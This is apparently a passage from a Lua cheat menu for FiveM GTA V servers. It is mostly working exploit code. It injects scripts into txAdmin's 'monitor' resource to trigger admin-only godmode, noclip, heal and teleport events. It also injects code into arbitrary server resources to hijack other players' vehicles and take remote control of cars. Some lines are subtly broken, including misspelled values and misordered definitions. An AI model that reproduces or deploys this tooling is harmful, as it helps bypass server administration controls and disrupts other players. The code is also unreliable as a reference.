       MachoMenuNotification("Auto Reset", "Deactivated - Auto reset stopped")
   end
)
local antiCarryLoop = false
local lastFreePosition = nil

MachoMenuCheckbox(GeneralLeftSection, "Anti Carry & Drag", 
   function()
       antiCarryLoop = true
       local playerPed = PlayerPedId()
       lastFreePosition = GetEntityCoords(playerPed)
       MachoMenuNotification("Anti Carry & Drag", "Activated - Protected from being carried")
       
       Citizen.CreateThread(function()
           while antiCarryLoop do
               local playerPed = PlayerPedId()
               
               -- Check if player is being carried or attached
               if IsEntityAttached(playerPed) then
                   -- Get who is carrying/attached to
                   local attachedTo = GetEntityAttachedTo(playerPed)
                   
                   if DoesEntityExist(attachedTo) then
                       -- Check if attached to another player
                       local isAttachedToPlayer = false
                       local carrierInfo = "Unknown"
                       
                       for i = 0, 255 do
                           if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                               local otherPlayerPed = GetPlayerPed(i)
                               if otherPlayerPed == attachedTo then
                                   isAttachedToPlayer = true
                                   local playerName = GetPlayerName(i) or "Unknown"
                                   local serverId = GetPlayerServerId(i) or 0
                                   carrierInfo = string.format("%s (ID: %d, Server: %d)", playerName, i, serverId)
                                   break
                               end
                           end
                       end
                       
                       -- Detach from player carries
                       if isAttachedToPlayer then
                           DetachEntity(playerPed, true, true)
                           
                           -- Return to last safe position
                           if lastFreePosition then
                               SetEntityCoords(playerPed, lastFreePosition.x, lastFreePosition.y, lastFreePosition.z, false, false, false, true)
                           end
                           
                           -- Clear any carry animations
                           ClearPedTasks(playerPed)
                           ClearPedSecondaryTask(playerPed)
                           
                           MachoMenuNotification(" Carry & Drag BLOCKED", 
                               string.format("Prevented Carry & Drag by: %s", carrierInfo))
                       end
                   end
               else
                   -- Not attached - update safe position
                   local currentPos = GetEntityCoords(playerPed)
                   
                   -- Only update if player is not in a weird state
                   if not IsPedRagdoll(playerPed) and not IsPedBeingStunned(playerPed) then
                       lastFreePosition = currentPos
                   end
               end
               
               -- Also prevent pickup animations
               if IsPedBeingStunned(playerPed, 0) then
                   SetPedToRagdoll(playerPed, 1, 1, 0, 0, 0, 0)
                   ClearPedTasks(playerPed)
               end
               
               -- Prevent being grabbed
               if GetPedConfigFlag(playerPed, 292, true) then -- PED_CONFIG_FLAG_DisableMelee
                   SetPedConfigFlag(playerPed, 292, false)
               end
               
               Citizen.Wait(100)
           end
       end)
   end,
   function()
       antiCarryLoop = false
       lastFreePosition = nil
       MachoMenuNotification("Anti Carry & Drag", "Deactivated")
   end
)
MachoMenuText(GeneralLeftSection,"Txadmin exploits")


    MachoMenuButton(GeneralLeftSection, "Check Txadmin", function()
    local resourceState = GetResourceState("monitor")
    if resourceState == "started" or resourceState == "starting" then
        MachoMenuNotification("Txadmin Found", "sucsess")
    else
        MachoMenuNotification("Txadmin Not Found", "Faild")
    end
    end)

    MachoMenuButton(GeneralLeftSection, "Tp to Waypoint", function()
        MachoInjectResource('monitor', [[TriggerEvent("txcl:tpToWaypoint")]])
        MachoMenuNotification("sucsess", "TxAdmin TPW")
    end)
    MachoMenuButton(GeneralLeftSection, "Txadmin heal", function()
        MachoInjectResource('monitor', [[TriggerEvent('txcl:heal')]])
        MachoMenuNotification("sucsess", "Txadmin heal")
    end)

    MachoMenuButton(GeneralLeftSection, "Vehicle boost", function()
        MachoInjectResource('monitor', [[TriggerEvent('txcl:vehicle:boost')]])
        MachoMenuNotification("sucsess", "Vehicle boost")
    end)
    MachoMenuButton(GeneralLeftSection, "Vehicle fix", function()
        MachoInjectResource('monitor', [[TriggerEvent('txcl:vehicle:fix')]])
        MachoMenuNotification("sucsess", "Vehicle fix")
    end)
    MachoMenuButton(GeneralLeftSection, "Txadmin menu client side acc", function()
    MachoInjectResource('monitor', [[menuIsAccessible = true]])
    MachoMenuNotification("Menu Access", "TxAdmin menu access Activated")
    end)
    local selectedKey = 0
    MachoMenuKeybind(GeneralLeftSection, "Tp to Waypoint Key", 0, function(key, toggle)
    selectedKey = key
    end)

    MachoOnKeyDown(function(key)
        if key == selectedKey then
         MachoInjectResource('monitor', [[TriggerEvent("txcl:tpToWaypoint")]])
        MachoMenuNotification("sucsess", "TxAdmin TPW")
        end
    end)
    MachoMenuCheckbox(GeneralLeftSection, "Show Player IDs", 
        function()
            isPlayerIdsEnabled = true
            startPlayerIdThread()
        end,
        function()
            isPlayerIdsEnabled = false
        end
    )

    MachoMenuCheckbox(GeneralLeftSection, "Txadmin Superjump", 
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'superjump', true)]])
            MachoMenuNotification("Superjump", "Superjump Activated")
        end,
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'none', nil)]])
            MachoMenuNotification("Superjump", "Superjump Deactivated")
        end
    )
    MachoMenuCheckbox(GeneralLeftSection, "Txadmin Noclip", 
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'noclip', true)]])
            MachoMenuNotification("Noclip", "Noclip Activated")
        end,
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'none', nil)]])
            MachoMenuNotification("Noclip", "Noclip Deactivated")
        end
    )
    local selectedKey = 0
    local nocliptx = flase
    MachoMenuKeybind(GeneralLeftSection, "Txadmin Noclip Key", 0, function(key, toggle)
    selectedKey = key
    end)

    MachoOnKeyDown(function(key)
        if key == selectedKey then
            if not nocliptx then
                nocliptx = true
                MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'noclip', true)]])
                MachoMenuNotification("Txadmin Noclip", "Txadmin Noclip activated")
            else
                nocliptx = false
                MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'none', nil)]])
                MachoMenuNotification("Txadmin Noclip", "Txadmin Noclip deactivate")
            end
        end
    end)

    MachoMenuCheckbox(GeneralLeftSection, "Txadmin Goodmode", 
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'godmode', true)]])
            MachoMenuNotification("Godmode", "Godmode Activated")
        end,
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'none', nil)]])
            MachoMenuNotification("Godmode", "Godmode Deactivated")
        end
    )
    local GeneralRightTop = MachoMenuGroup(GeneralTab, "free cam", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, 5 + MachoPaneGap + RightSectionHeight)

         MachoMenuText(GeneralRightTop,"i will add it")
    local glovalGeneralRightBottom = MachoMenuGroup(GeneralTab, "Movments", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap + RightSectionHeight + 5, 
        MenuSize.x - 5, MenuSize.y - 5)
isNoclipEnabled = false
noclipSpeed = 1.0
local pendingNoclipSpeed = 1.0
local lastSliderValue = 10
local lastSliderUpdate = 0
local speedChangePending = false
local speedChangeTimer = 0

local noclipSpeedSliderValue = 10
local NoClipSpeedSlider = MachoMenuSlider(glovalGeneralRightBottom, "SkyDive", 10, 1, 500, "%", 0, function(Value)
    local currentTime = GetGameTimer()
    if Value ~= lastSliderValue and currentTime - lastSliderUpdate >= 100 then
        noclipSpeedSliderValue = Value
        pendingNoclipSpeed = Value / 10
        lastSliderValue = Value
        lastSliderUpdate = currentTime
        speedChangePending = true
        speedChangeTimer = currentTime
    end
end)

MachoMenuCheckbox(glovalGeneralRightBottom, "SkyDive", 
    function()
        isNoclipEnabled = true
        local me = PlayerPedId()
        TaskSkyDive(me)
        MachoMenuNotification("SkyDive", "SkyDive activated")
    end,
    function()
        isNoclipEnabled = false
        local me = PlayerPedId()
        ClearPedTasks(me)
        MachoMenuNotification("SkyDive", "SkyDive deactivate")
    end

)
local selectedKey = 0

MachoMenuKeybind(glovalGeneralRightBottom, "SkyDive Key", 0, function(key, toggle)
    selectedKey = key
end)

MachoOnKeyDown(function(key)
    if key == selectedKey then
        if not isNoclipEnabled then
            isNoclipEnabled = true
            local me = PlayerPedId()
            TaskSkyDive(me)
            MachoMenuNotification("SkyDive", "SkyDive activated")
        else
            isNoclipEnabled = false
            local me = PlayerPedId()
            ClearPedTasks(me)
            MachoMenuNotification("SkyDive", "SkyDive deactivate")
        end
    end
end)

CreateThread(function()
    local me = PlayerPedId()
    local isInVehicle = false
    local shakeCounter = 0

    while true do
        Wait(0)

        local vehicle = GetVehiclePedIsIn(me, false)
        isInVehicle = vehicle ~= nil and vehicle ~= 0

        noclipSpeed = pendingNoclipSpeed

        if speedChangePending and isNoclipEnabled then
            local currentTime = GetGameTimer()
            if currentTime - speedChangeTimer >= 500 then
                isNoclipEnabled = false
                ClearPedTasks(me)
                Wait(0)
                isNoclipEnabled = true
                TaskSkyDive(me)
                speedChangePending = false
            end
        end

        if isNoclipEnabled then
            shakeCounter = shakeCounter + 1
            if shakeCounter >= 10 then
                StopGameplayCamShaking(true)
                ShakeGameplayCam("SKY_DIVING_SHAKE", 0.0)
                shakeCounter = 0
            end

            FreezeEntityPosition(me, true, false)
            SetEntityInvincible(me, true)

            if isInVehicle then
                SetEntityInvincible(vehicle, true)
            end

            if not isInVehicle then
                local x, y, z = table.unpack(GetEntityCoords(me, true))
                local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
                local pitch = GetGameplayCamRelativePitch()

                local dx = -math.sin(heading * math.pi / 180.0)
                local dy = math.cos(heading * math.pi / 180.0)
                local dz = math.sin(pitch * math.pi / 180.0)

                local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                if len ~= 0 then
                    dx = dx / len
                    dy = dy / len
                    dz = dz / len
                end

                local speed = noclipSpeed

                SetEntityVelocity(me, 0.0, 0.0, 0.0)

                local deltaTime = GetFrameTime()
                speed = speed * deltaTime * 60

                if IsControlPressed(0, 32) then
                    x = x + speed * dx
                    y = y + speed * dy
                    z = z + speed * dz
                end

                if IsControlPressed(0, 34) then
                    local leftVector = vector3(-dy, dx, 0.0)
                    x = x + speed * leftVector.x
                    y = y + speed * leftVector.y
                end

                if IsControlPressed(0, 269) then
                    x = x - speed * dx
                    y = y - speed * dy
                    z = z - speed * dz
                end

                if IsControlPressed(0, 9) then
                    local rightVector = vector3(dy, -dx, 0.0)
                    x = x + speed * rightVector.x
                    y = y + speed * rightVector.y
                end

                if IsControlPressed(0, 22) then
                    z = z + speed
                end

                if IsControlPressed(0, 62) then
                    z = z - speed
                end

                SetEntityCoordsNoOffset(me, x, y, z, true, true, true)
                SetEntityHeading(me, heading)
            else
                local x, y, z = table.unpack(GetEntityCoords(vehicle, true))
                local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(vehicle)
                local pitch = GetGameplayCamRelativePitch()

                local dx = -math.sin(heading * math.pi / 180.0)
                local dy = math.cos(heading * math.pi / 180.0)
                local dz = math.sin(pitch * math.pi / 180.0)

                local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                if len ~= 0 then
                    dx = dx / len
                    dy = dy / len
                    dz = dz / len
                end

                local speed = noclipSpeed

                local deltaTime = GetFrameTime()
                speed = speed * deltaTime * 60

                if IsControlPressed(0, 32) then
                    x = x + speed * dx
                    y = y + speed * dy
                    z = z + speed * dz
                end

                if IsControlPressed(0, 34) then
                    local leftVector = vector3(-dy, dx, 0.0)
                    x = x + speed * leftVector.x
                    y = y + speed * leftVector.y
                end

                if IsControlPressed(0, 269) then
                    x = x - speed * dx
                    y = y - speed * dy
                    z = z - speed * dz
                end

                if IsControlPressed(0, 9) then
                    local rightVector = vector3(dy, -dx, 0.0)
                    x = x + speed * rightVector.x
                    y = y + speed * rightVector.y
                end

                if IsControlPressed(0, 22) then
                    z = z + speed
                end

                if IsControlPressed(0, 62) then
                    z = z - speed
                end

                SetEntityCoordsNoOffset(vehicle, x, y, z, true, true, true)
                SetEntityHeading(vehicle, heading)
            end
        else
            SetEntityInvincible(me, false)
            FreezeEntityPosition(me, false, true)

            if isInVehicle then
                SetEntityInvincible(vehicle, false)
            end
        end
    end
end)
local superSpeedLoop = false
MachoMenuCheckbox(glovalGeneralRightBottom, "Fast run", 
   function()
       superSpeedLoop = true
       MachoMenuNotification("Fast run", "Activated")
       
       Citizen.CreateThread(function()
           while superSpeedLoop do
               local playerPed = PlayerPedId()
               SetRunSprintMultiplierForPlayer(PlayerId(), 3.0)
               SetSwimMultiplierForPlayer(PlayerId(), 3.0)
               SetPedMoveRateOverride(playerPed, 2.5)
               
               -- Alternative speed boost
               if IsPedRunning(playerPed) or IsPedSprinting(playerPed) then
                   local forwardVector = GetEntityForwardVector(playerPed)
                   local velocity = GetEntityVelocity(playerPed)
                   SetEntityVelocity(playerPed, 
                       velocity.x + forwardVector.x * 0.5, 
                       velocity.y + forwardVector.y * 0.5, 
                       velocity.z
                   )
               end
               
               Citizen.Wait(0)
           end
           
           local playerPed = PlayerPedId()
           SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
           SetSwimMultiplierForPlayer(PlayerId(), 1.0)
           SetPedMoveRateOverride(playerPed, 1.0)
       end)
   end,
   function()
       superSpeedLoop = false
       MachoMenuNotification("Fast run", "Deactivated")
   end
)
local superJumpLoop = false
MachoMenuCheckbox(glovalGeneralRightBottom, "Super Jump", 
    function()
        superJumpLoop = true
        MachoMenuNotification("Super Jump", "Activated")
        
        Citizen.CreateThread(function()
            while superJumpLoop do
                SetSuperJumpThisFrame(PlayerId())
                Citizen.Wait(0)
            end
        end)
    end,
    function()
        superJumpLoop = false
        MachoMenuNotification("Super Jump", "Deactivated")
    end
)
MachoMenuCheckbox(glovalGeneralRightBottom, "No Ragdoll", 
  function()
      fullNoRagdollLoop = true
      MachoMenuNotification("Full No Ragdoll", "Activated")
      
      Citizen.CreateThread(function()
          while fullNoRagdollLoop do
              local playerPed = PlayerPedId()
              
              -- تعطيل كامل لجميع أنواع Ragdoll
              SetPedConfigFlag(playerPed, 33, true)
              SetPedConfigFlag(playerPed, 461, true)   -- DieWhenRagdoll
              SetPedConfigFlag(playerPed, 89, true)   -- DontActivateRagdollFromAnyPedImpact
              SetPedConfigFlag(playerPed, 106, true)  -- DontActivateRagdollFromVehicleImpact
              SetPedConfigFlag(playerPed, 107, true)  -- DontActivateRagdollFromBulletImpact
              SetPedConfigFlag(playerPed, 108, true)  -- DontActivateRagdollFromExplosions
              SetPedConfigFlag(playerPed, 109, true)  -- DontActivateRagdollFromFire
              SetPedConfigFlag(playerPed, 110, true)  -- DontActivateRagdollFromElectrocution
              SetPedConfigFlag(playerPed, 160, true)  -- DontActivateRagdollFromImpactObject
              SetPedConfigFlag(playerPed, 161, true)  -- DontActivateRagdollFromMelee
              SetPedConfigFlag(playerPed, 162, true)  -- DontActivateRagdollFromWaterJet
              SetPedConfigFlag(playerPed, 163, true)  -- DontActivateRagdollFromDrowning
              SetPedConfigFlag(playerPed, 164, true)  -- DontActivateRagdollFromFalling
              SetPedConfigFlag(playerPed, 165, true)  -- DontActivateRagdollFromRubberBullet
              SetPedConfigFlag(playerPed, 198, true)
              SetPedConfigFlag(playerPed, 314, true)  -- DontActivateRagdollOnPedCollisionWhenDead
              SetPedConfigFlag(playerPed, 199, true)  -- DontActivateRagdollOnVehicleCollisionWhenDead
              SetPedConfigFlag(playerPed, 235, true)  -- AllowBlockDeadPedRagdollActivation
              SetPedConfigFlag(playerPed, 260, true)  -- SuppressLowLODRagdollSwitchWhenCorpseSettles
              SetPedConfigFlag(playerPed, 306, true)  -- DontActivateRagdollFromPlayerPedImpact
              SetPedConfigFlag(playerPed, 307, true)  -- DontActivateRagdollFromAiRagdollImpact
              SetPedConfigFlag(playerPed, 308, true)  -- DontActivateRagdollFromPlayerRagdollImpact
              SetPedConfigFlag(playerPed, 336, true)  -- DontActivateRagdollForVehicleGrab
              SetPedConfigFlag(playerPed, 367, true)
              SetPedConfigFlag(playerPed, 301, true)  -- DontActivateRagdollFromSmokeGrenade
              
              -- تعطيل جميع القدرات على Ragdoll
              SetPedConfigFlag(playerPed, 151, false) -- CanActivateRagdollWhenVehicleUpsideDown
              SetPedConfigFlag(playerPed, 227, false) -- ForceRagdollUponDeath
              SetPedConfigFlag(playerPed, 287, false) -- RagdollingOnBoat
              SetPedConfigFlag(playerPed, 318, false) -- ActivateRagdollFromMinorPlayerContact
              SetPedConfigFlag(playerPed, 460, false) -- RagdollFloatsIndefinitely
              
              -- تعطيل مباشر ونهائي
              SetPedCanRagdoll(playerPed, false)
              SetPedCanRagdollFromPlayerImpact(playerPed, false)
              
              -- منع أي ragdoll قسري
              if IsPedRagdoll(playerPed) then
                  SetPedToRagdoll(playerPed, 0, 0, 0, false, false, false)
              end
              
              Citizen.Wait(50) -- تحديث سريع جداً
          end
          
          -- استعادة Ragdoll الطبيعي عند التعطيل
          local playerPed = PlayerPedId()
          SetPedCanRagdoll(playerPed, true)
          SetPedCanRagdollFromPlayerImpact(playerPed, true)
          
          -- إعادة تفعيل الفلاقات الطبيعية
          SetPedConfigFlag(playerPed, 33, false)
          SetPedConfigFlag(playerPed, 89, false)
          SetPedConfigFlag(playerPed, 106, false)
          SetPedConfigFlag(playerPed, 107, false)
          SetPedConfigFlag(playerPed, 314, false)
          SetPedConfigFlag(playerPed, 108, false)
          SetPedConfigFlag(playerPed, 109, false)
          SetPedConfigFlag(playerPed, 110, false)
          SetPedConfigFlag(playerPed, 151, true)
          SetPedConfigFlag(playerPed, false, true)
          SetPedConfigFlag(playerPed, 160, false)
          SetPedConfigFlag(playerPed, 161, false)
          SetPedConfigFlag(playerPed, 162, false)
          SetPedConfigFlag(playerPed, 163, false)
          SetPedConfigFlag(playerPed, 164, false)
          SetPedConfigFlag(playerPed, 165, false)
          SetPedConfigFlag(playerPed, 198, false)
          SetPedConfigFlag(playerPed, 199, false)
          SetPedConfigFlag(playerPed, 227, true)
          SetPedConfigFlag(playerPed, 235, false)
          SetPedConfigFlag(playerPed, 461, false)
          SetPedConfigFlag(playerPed, 260, false)
          SetPedConfigFlag(playerPed, 287, true)
          SetPedConfigFlag(playerPed, 306, false)
          SetPedConfigFlag(playerPed, 307, false)
          SetPedConfigFlag(playerPed, 308, false)
          SetPedConfigFlag(playerPed, 318, true)
          SetPedConfigFlag(playerPed, 336, false)
          SetPedConfigFlag(playerPed, 367, false)
          SetPedConfigFlag(playerPed, 460, true)
      end)
  end,
  function()
      fullNoRagdollLoop = false
      MachoMenuNotification("No Ragdoll", "Deactivated")
  end
)
local staminaLoop = false
MachoMenuCheckbox(glovalGeneralRightBottom, "Infinite Stamina", 
    function()
        staminaLoop = true
        MachoMenuNotification("Infinite Stamina", "Activated")
        
        Citizen.CreateThread(function()
            while staminaLoop do
                RestorePlayerStamina(PlayerId(), 1.0)
                Citizen.Wait(100)
            end
        end)
    end,
    function()
        staminaLoop = false
        MachoMenuNotification("Infinite Stamina", "Deactivated")
    end
)

    
    local SectionChildWidth = MenuSize.x - TabsBarWidth
    local EachSectionWidth = (SectionChildWidth - 20) / 2 -- Adjusted for two sections

    local destroyer = MachoMenuAddTab(MenuWindow, "Vehicle")
    local sdSERVERCFWSectionChildWidth = MenuSize.x - TabsBarWidth
    local sdSERVERCFWEachSectionWidth = (sdSERVERCFWSectionChildWidth - 20) / 2

    local oyer = MachoMenuGroup(destroyer, "Vehicle & Self", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
    TabsBarWidth + sdSERVERCFWEachSectionWidth, MenuSize.y - 5)

        local VehicleCheck = MachoMenuGroup(destroyer, "Vehicle & CheckBox", 
        TabsBarWidth + EachSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, MenuSize.y - 5)
        
        
-- RGB Vehicle Color System
local redValue = 255
local greenValue = 255
local blueValue = 255

-- Function to apply colors automatically
local function applyRGBColor()
    local playerPed = PlayerPedId()
    
    if IsPedInAnyVehicle(playerPed, false) then
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        
        -- Apply RGB colors to vehicle
        SetVehicleCustomPrimaryColour(vehicle, redValue, greenValue, blueValue)
        SetVehicleCustomSecondaryColour(vehicle, redValue, greenValue, blueValue)
    end
end


-- Red Slider
local RedSlider = MachoMenuSlider(oyer, "Red", 255, 0, 255, "%", 0, function(Value)
    redValue = math.floor(Value)
    applyRGBColor()
end)

-- Green Slider
local GreenSlider = MachoMenuSlider(oyer, "Green", 255, 0, 255, "%", 0, function(Value)
    greenValue = math.floor(Value)
    applyRGBColor()
end)

-- Blue Slider
local BlueSlider = MachoMenuSlider(oyer, "Blue", 255, 0, 255, "%", 0, function(Value)
    blueValue = math.floor(Value)
    applyRGBColor()
end)
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(outfitChangeInterval) -- استخدام المدة اللي حددها اللاعب

        if enableRandomOutfit and NetworkIsPlayerActive(PlayerId()) then
            local newPed = PlayerPedId()
            local success, error = pcall(function()
                -- تغيير مكونات الملابس بشكل عشوائي
                SetPedComponentVariation(newPed, 8, math.random(0, 15), 0, 2)   -- القميص
                SetPedComponentVariation(newPed, 11, math.random(0, 120), 0, 2) -- الجاكيت/الطبقة العلوية
                SetPedComponentVariation(newPed, 3, math.random(0, 15), 0, 2)   -- الذراعين
                SetPedComponentVariation(newPed, 4, math.random(0, 50), 0, 2)   -- البنطلون
                SetPedComponentVariation(newPed, 6, math.random(0, 30), 0, 2)   -- الأحذية

                -- تغيير الإكسسوارات
                SetPedPropIndex(newPed, 0, math.random(0, 10), 0, true) -- القبعة
                SetPedPropIndex(newPed, 1, math.random(0, 10), 0, true) -- النظارات
            end)

            if not success then
            end
        end
    end
end)
-- Rainbow Vehicle Color
local RainbowCar = false

-- Rainbow color function
local function getRainbowColor()
    local time = GetGameTimer() / 1000 -- Get time in seconds
    local speed = 2.0 -- Speed of color change
    
    local r = math.floor((math.sin(time * speed) * 127) + 128)
    local g = math.floor((math.sin(time * speed + 2) * 127) + 128)
    local b = math.floor((math.sin(time * speed + 4) * 127) + 128)
    
    return {r = r, g = g, b = b}
end



MachoMenuText(oyer,"Vehicle Control")

local selectedKey = 0

local selectedFlip = "Flip 1" -- تعريف افتراضي

MachoMenuDropDown(oyer, "Select Flip", function(selectedIndex)
    if selectedIndex == 0 then
        selectedFlip = "Flip 1"
    elseif selectedIndex == 1 then
        selectedFlip = "Flip 2"
    end
end, "Flip 1", "Flip 2")

MachoMenuButton(oyer, "Flip", function()
    local playerPed = PlayerPedId()
    if not DoesEntityExist(playerPed) then return end

    if IsPedSittingInAnyVehicle(playerPed) then
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        if DoesEntityExist(vehicle) then
            if selectedFlip == "Flip 1" then
                ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 10.5, 360.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                MachoMenuNotification("Success", "Flip 1 applied!")
            elseif selectedFlip == "Flip 2" then
                ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 10.5, 0.0, 270.0, 0.0, 0, 0, 1, 1, 0, 1)
                MachoMenuNotification("Success", "Flip 2 applied!")
            end
        else
            MachoMenuNotification("Error", "Vehicle not found!")
        end
    else
        MachoMenuNotification("Error", "You must be inside a vehicle!")
    end
end)

-- دالة للحصول على أقرب سيارة فيها شخص حقيقي
local function GetNearestVehicleWithPlayer()
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    local nearestVehicle = nil
    local nearestDistance = math.huge
    
    -- البحث عن جميع السيارات القريبة
    for vehicle in EnumerateVehicles() do
        local vehicleCoords = GetEntityCoords(vehicle)
        local distance = #(playerCoords - vehicleCoords)
        
        -- التحقق من وجود سائق في السيارة
        local driverPed = GetPedInVehicleSeat(vehicle, -1)
        if driverPed and driverPed ~= 0 and driverPed ~= playerPed then
            -- التحقق من أن السائق لاعب حقيقي وليس NPC
            if IsPedAPlayer(driverPed) then
                if distance < nearestDistance then
                    nearestDistance = distance
                    nearestVehicle = vehicle
                end
            end
        end
    end
    
    return nearestVehicle, nearestDistance
end

-- دالة تعداد السيارات
function EnumerateVehicles()
    return coroutine.wrap(function()
        local iter, id = FindFirstVehicle()
        if not id or id == 0 then
            EndFindVehicle(iter)
            return
        end
        
        local enum = {handle = iter, destructor = EndFindVehicle}
        setmetatable(enum, entityEnumerator)
        
        local next = true
        repeat
            coroutine.yield(id)
            next, id = FindNextVehicle(iter)
        until not next
        
        enum.destructor, enum.handle = nil, nil
        EndFindVehicle(iter)
    end)
end

local entityEnumerator = {
    __gc = function(enum)
        if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
        end
    end
}

-- زر القائمة لسرقة أقرب سيارة
MachoMenuButton(oyer, "Hijack Nearest Vehicle", function()
    local playerPed = PlayerPedId()
    local nearestVehicle, distance = GetNearestVehicleWithPlayer()
    
    if nearestVehicle then
        local driverPed = GetPedInVehicleSeat(nearestVehicle, -1)
        
        ClearPedTasksImmediately(playerPed)
        
        MachoInjectResource("any", [[
            Citizen.CreateThread(function()
                local playerPed = PlayerPedId()
                local targetVehicle = ]] .. nearestVehicle .. [[
                local driverPed = GetPedInVehicleSeat(targetVehicle, -1)
                
                if targetVehicle ~= 0 then
                    SetPedMoveRateOverride(playerPed, 10.0)
                    ClearPedTasks(playerPed)
                    SetVehicleForwardSpeed(targetVehicle, 0.0)
                    SetVehicleDoorsLocked(targetVehicle, 1)
                    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                    
                    if driverPed then
                        TaskLeaveVehicle(driverPed, targetVehicle, 0)
                    end
                    
                    SetPedMoveRateOverride(playerPed, 3.0)
                    
                    ClearPedTasks(playerPed)
                    SetVehicleForwardSpeed(targetVehicle, 0.0)
                    
                    SetPedIntoVehicle(playerPed, targetVehicle, -1)
                    TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                    
                    SetPedMoveRateOverride(playerPed, 1.0)
                end
            end)
        ]])
        
        MachoMenuNotification("Vehicle", "Hijacking nearest vehicle with player (Distance: " .. math.floor(distance) .. "m)")
    else
        MachoMenuNotification("Error", "No vehicle with player found")
    end
end)

local menuDUI = nil
local menuVisible = false
local HELP_URL = "https://nitwit123.github.io/carauction/"

-- Use MachoMenuCheckbox with two callbacks: one for enabling, one for disabling.
MachoMenuCheckbox(oyer, "Remote Car Control", 
    -- CallbackEnabled: This code runs when the checkbox is selected (enabling remote control)
    function()
        local playerPed = PlayerPedId()
        local targetVehicle = GetVehiclePedIsIn(playerPed, false)
        
        -- Check if the player is in a vehicle
        if targetVehicle ~= 0 and DoesEntityExist(targetVehicle) then
            -- Clear the player's tasks immediately
            ClearPedTasksImmediately(playerPed)

            local originalPos = GetEntityCoords(playerPed)
            local originalHeading = GetEntityHeading(playerPed)

            -- Select a random resource to inject the remote control logic
            local targetResource = nil
            local resourcePriority = {"any", "any", "any"}
            local foundResources = {}
            for _, resourceName in ipairs(resourcePriority) do
                if GetResourceState(resourceName) == "started" then
                    table.insert(foundResources, resourceName)
                end
            end
            
            if #foundResources > 0 then
                targetResource = foundResources[math.random(1, #foundResources)]
            else
                local allResources = {}
                for i = 0, GetNumResources() - 1 do
                    local resourceName = GetResourceByFindIndex(i)
                    if resourceName and GetResourceState(resourceName) == "started" then
                        table.insert(allResources, resourceName)
                    end
                end
                if #allResources > 0 then
                    targetResource = allResources[math.random(1, #allResources)]
                end
            end

            if targetResource then
                -- Create the help menu (DUI) on the local player's machine
                if not GetCurrentResourceName then
                    return
                end
                
                menuDUI = MachoCreateDui(HELP_URL)
                if not menuDUI then
                    MachoMenuNotification("Remote Car", "Failed to create help menu.")
                    return
                end
                Citizen.Wait(1000)
                MachoShowDui(menuDUI)
                menuVisible = true
                
                -- Loop to handle showing/hiding the menu
                Citizen.CreateThread(function()
                    while menuDUI do
                        Citizen.Wait(0)
                        if IsControlJustPressed(0, 167) then -- F6 to toggle menu
                            menuVisible = not menuVisible
                            if menuVisible then
                                MachoShowDui(menuDUI)
                            else
                                MachoHideDui(menuDUI)
                            end
                        end
                    end
                end)
                
                -- Inject the remote control logic into the target resource
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetVehicle = ]] .. targetVehicle .. [[
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[

                        if targetVehicle ~= 0 and DoesEntityExist(targetVehicle) then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

                            SetEntityVisible(playerPed, false, false)

                            TaskLeaveVehicle(playerPed, targetVehicle, 0)
                            SetPedMoveRateOverride(playerPed, 10.0)
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)

                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)

                            -- Wait for control of the vehicle
                            local hasControl = false
                            local timeout = 0
                            while not hasControl and timeout < 200 do
                                Citizen.Wait(10)
                                if NetworkHasControlOfEntity(targetVehicle) then
                                    hasControl = true
                                else
                                    NetworkRequestControlOfEntity(targetVehicle)
                                end
                                timeout = timeout + 1
                            end

                            if not hasControl then
                                MachoMenuNotification("Remote Car", "Failed to get control of the vehicle. Aborting.")
                                SetEntityVisible(playerPed, true, false)
                                return
                            end
                            
                            -- Wait for 0.6 seconds after gaining control
                            Citizen.Wait(600)

                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)

                            Citizen.Wait(500)
                            keepHidden = false

                            ClearPedTasksImmediately(playerPed)
                            SetEntityAsMissionEntity(playerPed, true, true)
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)

                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
